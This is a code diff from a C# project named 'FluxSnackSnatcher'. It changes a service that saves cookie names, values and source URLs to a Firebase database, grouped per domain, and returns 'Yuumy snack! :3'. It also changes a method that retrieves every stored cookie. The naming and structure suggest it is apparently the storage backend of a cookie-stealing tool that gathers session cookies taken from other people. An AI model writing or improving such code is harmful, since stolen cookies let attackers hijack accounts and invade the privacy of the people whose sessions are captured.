@@ -17,12 +17,22 @@ namespace FluxSnackSnatcher.Services
         {
             try
             {
-                await _firebaseClient
-                   .Child("cookies")
-                   .Child(ExtractDomainSegment(cookie.ServerUrl))
-                   .PutAsync(cookie);
+                var childElement = ExtractDomainSegment(cookie.ServerUrl);
 
-                return $"Yuumy snack! :3";
+                var cookies = await _firebaseClient
+                    .Child("cookies")
+                    .OnceAsync<IList<CookieData>>();
+
+                var list = cookies.FirstOrDefault(c => c.Key.Equals(childElement))?.Object ?? new List<CookieData>();
+
+                list.Add(cookie);
+
+                await _firebaseClient
+                    .Child("cookies")
+                    .Child(childElement)
+                    .PutAsync(list);
+
+                return "Yuumy snack! :3";
             }
             catch (Exception ex)
             {
@@ -30,29 +40,30 @@ namespace FluxSnackSnatcher.Services
             }
         }
 
-        public async Task<List<CookieData>> GetCookies()
+
+        public async Task<IDictionary<string, IList<CookieData>>> GetCookies()
         {
             try
             {
-                var cookies = await _firebaseClient
+                var firebaseResult = await _firebaseClient
                     .Child("cookies")
-                    .OnceAsync<CookieData>();
+                    .OnceAsync<IList<CookieData>>();
 
-                return cookies.Select(item => new CookieData
-                {
-                    Name = item.Object.Name,
-                    Value = item.Object.Value,
-                    AddedAt = item.Object.AddedAt,
-                    ServerUrl = item.Object.ServerUrl
-                }).ToList();
+                var cookiesDictionary = firebaseResult
+                    .ToDictionary(
+                        item => item.Key,
+                        item => item.Object
+                    );
+
+                return cookiesDictionary;
             }
             catch (Exception ex)
             {
-                throw new Exception($"Erro ao obter cookies: {ex.Message}", ex);
+                throw new Exception($"Erro ao obter cookies do Firebase: {ex.Message}", ex);
             }
         }
 
-        public static string ExtractDomainSegment(string url)
+        private static string ExtractDomainSegment(string url)
         {
             var sections = url.Split(".");
 
